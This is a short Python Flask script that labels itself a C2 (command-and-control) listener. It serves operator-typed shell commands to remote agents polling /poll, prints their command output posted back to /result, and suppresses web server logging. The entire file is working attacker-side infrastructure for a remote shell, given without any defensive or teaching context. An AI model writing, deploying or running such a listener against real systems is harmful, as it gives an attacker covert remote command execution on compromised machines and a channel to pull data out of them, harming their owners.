from flask import Flask, request
import logging

# Suppress flask logging
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

app = Flask(__name__)

@app.route('/poll', methods=['GET'])
def poll():
    try:
        cmd = input("Shell> ")
        return cmd
    except EOFError:
        return "exit"

@app.route('/result', methods=['POST'])
def result():
    print(request.data.decode())
    return "OK"

if __name__ == '__main__':
    print("[-] Starting C2 Listener on port 8000...")
    app.run(host='0.0.0.0', port=8000)
